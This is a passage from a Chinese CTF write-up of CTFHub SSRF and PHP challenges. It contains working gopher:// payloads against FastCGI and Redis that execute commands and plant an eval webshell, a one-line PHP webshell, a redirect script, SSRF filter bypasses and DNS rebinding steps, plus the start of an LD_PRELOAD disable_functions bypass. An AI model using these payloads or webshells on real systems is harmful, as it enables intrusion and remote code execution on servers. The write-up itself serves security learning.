class="comment">//负载数据</span></span><br><span class="line">          <span class="type">unsigned</span> <span class="type">char</span> paddingData[paddingLength]; <span class="comment">//填充数据</span></span><br><span class="line">&#125; FCGI_Record;</span><br></pre></td></tr></table></figure><p>构造出的执行<code>ls /</code>命令的FastCGI请求（ 调整过格式，不标准）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">CONTENT_LENGTH</span> <span class="number">34</span> <span class="comment"># 内容长度</span></span><br><span class="line">CONTENT_TYPE application/text <span class="comment"># 内容格式</span></span><br><span class="line">REMOTE_PORT <span class="number">9985</span> <span class="comment"># 请求端口</span></span><br><span class="line">SERVER_NAME localhost <span class="comment"># server名</span></span><br><span class="line">GATEWAY_INTERFACE FastCGI/<span class="number">1</span>.<span class="number">0</span> <span class="comment"># API</span></span><br><span class="line">SERVER_SOFTWARE php/fcgiclient <span class="comment"># server端 软件</span></span><br><span class="line">REMOTE_ADDR <span class="number">127.0.0.1</span> <span class="comment"># 请求ip</span></span><br><span class="line">SCRIPT_FILENAME /var/www/html/index.php <span class="comment"># 脚本文件名</span></span><br><span class="line">SCRIPT_NAME /var/www/html/index.php <span class="comment"># 脚本名</span></span><br><span class="line">PHP_VALUE auto_prepend_file = php://input </span><br><span class="line">REQUEST_METHOD POST <span class="comment"># 请求方法</span></span><br><span class="line">SERVER_PORT <span class="number">8</span> <span class="comment"># server端口</span></span><br><span class="line">SERVER_PROTOCOL HTTP/<span class="number">1</span>.<span class="number">1</span> <span class="comment"># server 协议</span></span><br><span class="line">QUERYDOCUMENT_ROOT / <span class="comment"># 请求文件根目录</span></span><br><span class="line">IN_VALUE allow_url_include = On <span class="comment"># 设置 允许url包含</span></span><br><span class="line">SERVER_ADDR <span class="number">127.0.0.1</span> <span class="comment"># server ip</span></span><br><span class="line">REQUEST_URI /var/www/html/index.php <span class="comment"># 请求资源</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&lt;?php var_dump(system(&#x27;ls /&#x27;)); ?&gt;&quot;</span> <span class="comment"># 内容</span></span><br></pre></td></tr></table></figure><p>参考资料</p><p><s>真的写的很详细</s><a href="https://www.cnblogs.com/itbsl/p/9828776.html">CGI 和 FastCGI 协议的运行原理 </a></p><p>然后这个是题目给的附件地址<a href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/246268005">通用网关接口-FastCGI介绍 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写-CSDN博客</a></p><p><a href="https://www.cnblogs.com/R3col/p/14122692.html">SSRF_FastCGI - R3col - 博客园 (cnblogs.com)</a></p><h6 id="1-Gopherus">1.Gopherus</h6><p>使用条件：</p><ul><li>libcurl版本&gt;=7.45.0</li><li>PHP-FPM监听端口</li><li>PHP-FPM版本 &gt;= 5.3.3</li><li>知道服务器上任意一个php文件的绝对路径</li></ul><p>我是先访问了各种网站都没有反应</p><p>没办法了，只能根据提示攻击FastCGI了</p><p>用Gopherus，输入指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure><p>然后提示你给出一个应该存在于服务器中的文件名(最好是.php文件)<br>如果你不知道，按回车键，他们有默认的（我试过他的不行）</p><p>我事先用dirsearch扫过，什么都没扫出来。。。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/36.png" alt=""></p><p>没办法，看writeup用的是index.php,这里填这个就行了</p><p>然后提示你输入<code>Terminal command to run</code>，要运行的终端命令</p><p>这里我先用<code>ls</code>，会出现payload，但是这个payload需要再次编码</p><p>这里给出脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line"> </span><br><span class="line">payload = &quot;gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&quot;</span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">print(tmp)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/33.png" alt=""></p><p>改成你的payload就行了，再把编译后的payload输入到<code>?/url=</code>后面就行了</p><p>确实显示了index.php文件</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/37.png" alt=""></p><p>步骤一样重复使用Gopherus然后去把终端命令改成<code>ls /</code>即根目录</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/38.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/39.png" alt=""></p><p>看到了flag文件，步骤一样重复使用Gopherus把终端命令改成<code>cat /flag***</code>文件就能看到flag了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/40.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/41.png" alt=""></p><h6 id="2-蚁剑-3">2.蚁剑</h6><p>其实主要还是用gohperus，步骤一样，把终端命令改成生成一个一句话木马文件就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval(\$_POST[123]);?&gt;&quot; &gt;1.php</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/43.png" alt=""></p><p>生成完文件后页面会是这样</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/42.png" alt=""></p><p>然后用蚁剑连就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/44.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/45.png" alt=""></p><h6 id="3-利用nc-和exp">3.利用nc 和exp</h6><p>说实话我是觉得挺复杂的，网上挺多writeup的</p><p><a href="https://www.cnblogs.com/R3col/p/14122684.html#tid-eRX5Ci">CTFHub-技能树-SSRF - R3col - 博客园 (cnblogs.com)</a></p><h5 id="7-Redis协议">7.Redis协议</h5><blockquote><p>这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!</p></blockquote><p>这里我还是给出资料</p><blockquote><p>Redis是一个key-value存储系统。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>Redis 在默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。，也可以直接写入Webshell或者写入计划任务进行反弹shell。</p></blockquote><p>然后就是详情可点击这里<a href="https://xz.aliyun.com/t/5665#toc-8">浅析Redis中SSRF的利用 - 先知社区 (aliyun.com)</a></p><p>这题其实和上一题差不多，只是攻击对象从FastCGI改成了Redis</p><p>还是得用神器Gopherus上传WebShell</p><p>在Gopherus使用指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit redis</span><br></pre></td></tr></table></figure><p>提示你选择(ReverseShell/PHPShell)，这里选择PHPShell</p><blockquote><ol><li>Reverse Shell是通过远程服务器发送反向连接实现的，攻击者需要在目标系统上植入恶意代码并等待连接。而PHPShell则是通过在Web服务器上上传恶意PHPShell文件实现的，攻击者可以通过Web浏览器访问该文件来获取Shell。</li><li>Reverse Shell的目的是为了获取对目标系统的远程控制权，攻击者可以通过它执行任意命令。而PHPShell通常用于上传、下载、执行文件，以及获取系统信息等，目的通常是为了进一步入侵或数据窃取。</li></ol></blockquote><p>然后还是提示你</p><p>Give web root location of server (default is /var/www/html):</p><p>给出一个给出服务器的web根位置(默认为/var/www/html):</p><p>这里默认就行了</p><p>然后给出PHPShell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval(_POST[&quot;shell&quot;])?&gt;</span><br></pre></td></tr></table></figure><p>最后提示你</p><p>When it’s done you can get PHP Shell in /shell.php at the server with <code>cmd</code> as parmeter.</p><p>(当它完成后，你可以在服务器上以’ cmd '作为参数在/ Shell . PHP中获得PHP Shell。)</p><p>还是得记得把payload编译一次，还是上面的脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line"> </span><br><span class="line">payload = &quot;gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22shell%22%5D%29%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A&quot;</span><br><span class="line"></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">print(tmp)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/70.png" alt=""></p><p>把得到的payload写入url中，慢慢等，最后提示你超时，没什么问题其实已经上传成功了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/46.png" alt=""></p><p>有意思的是我一开始就在用dirsearch扫，这里扫出来了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/47.png" alt=""></p><p>使用蚁剑</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/48.png" alt=""></p><h5 id="8-URL-Bypass">8.URL Bypass</h5><p>从本题目开始，将介绍SSRF漏洞利用时的各种绕过方法。</p><blockquote><p>请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</p></blockquote><p>就是输入路径必须包含http://notfound.ctfhub.com，绕过这个限制就可以了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/49.png" alt=""></p><p>有三个方案（准确来说是两个）</p><ol><li><p>使用HTTP基础认证</p><blockquote><p>HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。<br>也就是：<code>http://www.xxx.com@www.yyy.com</code>形式</p><p>简单来说，就是http://www.baidu.com@192.168.0.1/与http://192.168.0.1请求的都是192.168.0.1的内容。</p><p>这里的@是主域名解析，即@符号后面直接跟域名，@符号前面的内容会被视为用户名，相当于以http://baidu.com的用户名访问192.168.0.1/flag.php，<strong>至于用户名是啥不重要，关键是@后面的才是解析的地址！</strong></p></blockquote><ul><li>payload：<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code></li></ul><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/50.png" alt=""></p></li><li><p><a href="http://xn--nip-hb0er53o.io">使用nip.io</a></p><blockquote><p><code>.nip.io</code> 是一个特殊的域名后缀，它提供了一种免费且简便的方式，可以将特定格式的域名解析为对应的IP地址，可以作为应用路由的解析服务。这省去了配置本地hosts文件的步骤。</p><p>例如，当访问<code>http://&lt;anything&gt;-&lt;IP Address&gt;.nip.io</code>时，它将解析到对应的IP地址<code>&lt;IP Address&gt;</code>。</p></blockquote><ul><li>payload：<code>?url=http://notfound.ctfhub.com.127.0.0.1.nip.io/flag.php</code></li></ul><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/51.png" alt=""></p></li><li><p>利用<code>xip.io</code>（可以直接访问该域名，里面有详细说明）</p><blockquote><p><code>.xip.io</code> 的功能是将 <code>notfound.ctfhub.com</code> 这个子域名解析到本地机器的IP地址 <code>127.0.0.1</code>。</p></blockquote><ul><li>尝试发现，<code>xip.io</code>被ban了</li></ul><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/52.png" alt=""></p></li></ol><p>至于为什么要访问flag.php…因为上面的题目flag都是在这里（应该）</p><h5 id="9-数字IP-Bypass">9.数字IP Bypass</h5><blockquote><p>这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p></blockquote><p>不能使用十进制，我们还有八进制，十六进制(<em>^_^</em>)，因为只ban了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/53.png" alt=""></p><p>1.ip转int（十进制）</p><p><a href="https://www.bejson.com/convert/ip2int/">在线ip转int,ip转数字-BeJSON.com</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 -&gt; 2130706433</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/54.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/55.png" alt=""></p><p>2.十六进制</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/57.png" alt=""></p><p>3.八进制</p><p>4.或者用其他指向127.0.0.1的地址都行，比如localhost、<a href="https://blog.csdn.net/">http://0/</a>等</p><h5 id="10-302跳转-Bypass">10.302跳转 Bypass</h5><blockquote><p>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p></blockquote><p>先去看看index.php和flag.php源码</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/60.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/61.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/59.png" alt=""></p><p>发现其实并没有ban localhost，直接用就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/63.png" alt=""></p><p>hhh，这题是302跳转，需要借助vps或者云服务器，在上面写一个可以用ip访问的文件,</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">if(isset($</span><span class="language-bash">_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span></span><br><span class="line">    header(&quot;Location: &#123;$_GET[&#x27;url&#x27;]&#125;&quot;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后访问vps上的脚本，跳转回去即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://IP:PORT/302.php?url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><h5 id="11-DNS重绑定-Bypass">11.DNS重绑定 Bypass</h5><blockquote><p>DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</p></blockquote><p>附件地址：<a href="https://zhuanlan.zhihu.com/p/89426041">https://zhuanlan.zhihu.com/p/89426041</a></p><blockquote><p>DNS重绑定DNS Rebinding攻击在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。<br>  放到这个题目的环境上来看，我们使用各种方法想来实现绕过，但是都无法访问，既然如此我们使用DNS重绑定，从DNS域名解析入手，有一个想法就是通过修该域名对应的IP，使一个域名对应两个IP，那么在多次的访问之下产生的访问效果是一样的实现IP绕过。</p></blockquote><p>不小心试了下localhost直接有了。。。</p><p>应该出题人忘记改了吧</p><p>不过我换<code>0/index.php</code>不行</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/64.png" alt=""></p><p>老样子各个url访问一次</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/66.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/67.png" alt=""></p><p>解题思路应该是用DNS重绑定，我们在此做一个详解。</p><p>对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass过滤掉.</p><p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击，利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0，这是为了防止有DNS服务器对解析结果进行缓存。这样就可以进行攻击了，完整的攻击流程为：</p><p>1、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</p><p>2、对于获得的IP进行判断，发现为非黑名单IP，则通过验证</p><p>3、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址</p><p>4、由于已经绕过验证，所以服务器端返回访问内网资源的结果</p><p>总结来说：由于我们无法在程序运行时以毫秒为单位手动更改DNS记录，所以要想实现DNS重绑定攻击，就必须配置一个自定义的恶意DNS服务器，并设定好指定域名的解析IP，再将TTL设置为0，使其解析时在非法内网IP与合法其他IP间反复横跳。</p><p></p><p>用下面这个网站可以进行DNS重绑定</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service (cmpxchg8b.com)</a></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/69.png" alt=""></p><p>绑定的两个ip中保证有一个是127.0.0.1即可，我这里和192.168.0.1绑定了，结果为</p><p><a href="http://7f000001.c0a80001.rbndr.us">7f000001.c0a80001.rbndr.us</a></p><p>因此我们的<code>url=7f000001.c0a80001.rbndr.us/flag.php</code> ，注意这个域名相当于绑定了两个ip地址（同一时刻只对应一个），由于无法确定进行dns校验时的ip是否为127.0.0.1，可能一次请求不成功，多刷新几次即可。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/SSRF/68.png" alt=""></p><h2 id="1-1Web进阶">1.1Web进阶</h2><h3 id="1-php">1.php</h3><h4 id="0-蚁剑插件">0.蚁剑插件</h4><p>以为下面的题大多都是antSword-lab的</p><p>能做下面的题最主要的是能成功下载插件</p><p>这个插件需要开代理</p><p>比如我用的clash，它占用的端口是7890</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/19.png" alt=""></p><p>去设置代理</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/20.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/21.png" alt=""></p><p>可以先测试一下成功了没有</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/22.png" alt=""></p><p><strong>记得点击保存</strong></p><p>然后去看插件</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/23.png" alt=""></p><p>记得是下载下面插件</p><p>1.<img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/24.png" alt=""></p><p>2.<img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/ShellShock/9.png" alt=""></p><p>下载完记得关闭代理然后保存！！！</p><h5 id="1-查看phpinfo">1.查看phpinfo</h5><p>直接使用插件获取信息</p><p>或者写个phpinfo.php页面上传到可以访问的位置</p><p>会自动调用phpinfo函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="1-Bypass-disable-function">1.Bypass disable_function</h4><p>PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用</p><p>要查看当前已禁用的函数列表，可以在 PHP 配置文件（php.ini）中查找 <code>disable_functions</code> 指令，或者使用 <code>phpinfo()</code> 函数来获取相关信息。</p><p>要禁用某个函数，只需在 <code>php.ini</code> 文件中添加或修改 <code>disable_functions</code> 指令，并列出要禁用的函数名称。例如，要禁用 <code>echo</code> 和 <code>header</code> 函数，可以将以下行添加到 <code>php.ini</code> 文件中：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = echo, header</span><br></pre></td></tr></table></figure><p>有四种绕过 disable_functions 的手法：</p><ol><li>攻击后端组件，寻找存在命令注入的 web 应用常用的后端组件，如，<code>ImageMagick</code> 的魔图漏洞、<code>bash</code> 的破壳漏洞等等</li><li>寻找未禁用的漏网函数，常见的执行命令的函数有 <code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>，偏僻的 <code>popen()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>，逐一尝试，或许有漏网之鱼</li><li>mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通信）；</li><li>利用环境变量 <code>LD_PRELOAD</code> 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</li></ol><p>资料👉<a href="https://www.freebuf.com/articles/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a></p><h5 id="1-LD-PRELOAD">1.LD_PRELOAD</h5><blockquote><p>目标:获取服务器上 /flag 文件中的 flag。需要了解 Linux LD_PRELOAD 环境变量。</p></blockquote><p>这里我们先了解一下LD——PRELOAD</p><blockquote><p>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。 putenv()用来改变或增加环境变量的内容. 参数string 的格式为name＝value, 如果该环境变量原先存在, 则变量内容会依参数string 改变, 否则此参数内容会成为新的环境变量.</p></blockquote><p>简单来说就是LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用</p><p>这题直接说了<code>本环境来源于AntSword-Labs</code>，去github上也能找到介绍👉<a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/1">官方题解</a></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/1.png" alt=""></p><p>说明就是和蚁剑有关系的，这里第一种方法我就介绍蚁剑吧</p><blockquote><p>前排提醒</p><p>如果操作没有反应，建议多次重复+刷新！！！</p></blockquote><h6 id="1-蚁剑">1.蚁剑</h6><p>先用php页面提供的Webshell用蚁剑连接(密码是ant)</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/2.png" alt=""></p><p>连接成功后发现了readflag文件，其实就是一个读取flag文件内容的shell脚本</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/3.png" alt=""></p><p>然后我们去看flag文件，发现什么都没有</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/4.png" alt=""></p><p>然后开启终端，发现什么命令都用不了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/5.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/6.png" alt=""></p><p>这就是disable_function吗😥</p><p>但是我们有插件😏</p><p>选择插件，然后选择模式<code>LD_PRELOAD</code>，点击开始</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/7.png" alt=""></p><p>然后提示成功并且生成了<code>.antproxy.php</code>文件</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/8.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/9.png" alt=""></p><p>其实这个文件也是个木马，但是绕过了LD_PRELOAD😎</p><p>然后我们用蚁剑连接这个php页面就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/10.png" alt=""></p><p>再用终端打开就发现能使用命令了，但是cat还是用不了(提示权限不够）😅</p><p>那就用tac或者使用readflag脚本就行了</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web2.0/php/Bypass%20disable_function/LD_PRELOAD/11.png" alt=""></p><h6 id="2-手工">2.手工</h6><p>步骤</p><ul><li>生成一个我们的恶意动态链接库文件</li><li>利用<code>putenv</code>设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发我们的恶意动态链接库文件</li><li>RCE（Remote Code Execution，意为远程代码执行）并获取flag</li></ul><p>生成动态链接库文件</p><p>先写一个c文件</p><p>我知道两种写法</p><ol><li></li></ol>   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 